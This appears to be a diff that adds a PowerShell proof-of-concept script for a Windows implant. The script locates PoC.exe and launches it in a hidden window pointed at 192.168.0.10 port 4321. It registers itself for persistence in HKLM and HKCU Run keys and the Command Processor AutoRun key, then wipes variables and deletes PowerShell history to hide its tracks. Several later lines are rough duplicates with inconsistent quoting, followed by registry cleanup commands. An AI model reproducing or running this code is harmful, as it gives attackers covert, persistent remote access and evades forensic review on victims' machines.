@@ -1,0 +1,29 @@
+$h = "192.168.0.10"
+$p = "4321"
+$nd_pth = Get-ChildItem C:\ -Filter PoC.exe -Recurse -ErrorAction SilentlyContinue | % { $_.FullName } | select-object -First 1
+$ps_pth = (Get-Process -Id $pid).Path   
+$cmd = "$ps_pth -WindowStyle Hidden -c ```"$nd_pth $h $p```"" 
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v PoC /t REG_SZ /d "$cmd" /f    
+reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v PoC /t REG_SZ /d "$cmd" /f          
+reg add "HKCU\Software\Microsoft\Command Processor" /v PoC /t REG_SZ /d "$cmd" /f
+Remove-Variable * -ErrorAction SilentlyContinue
+Remove-Item (Get-PSReadlineOption).HistorySavePath
+
+$a = @{
+
+"$ps_pth -WindowStyle Hidden -c `"$nd_pth $h $p`""
+
+}; Foreach ($b in $a) 
+{ 
+iex $b
+}
+
+$cmd = \"$ps_pth -WindowStyle Hidden -c \`"$nd_pth $h $p \`""
+$cmd = "$ps_pth -WindowStyle Hidden -c `"$nd_pth $h $p`""
+
+
+reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v PoC /t REG_SZ /d "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -c \"C:\Users\dev\Documents\PoC\target\debug\PoC.exe 192.168.0.10 4321\"" /f
+
+reg delete `"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`" /v PoC /f
+reg delete `"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`" /v PoC /f
+reg delete `"HKCU\\Software\\Microsoft\\Command Processor`" /v PoC /f
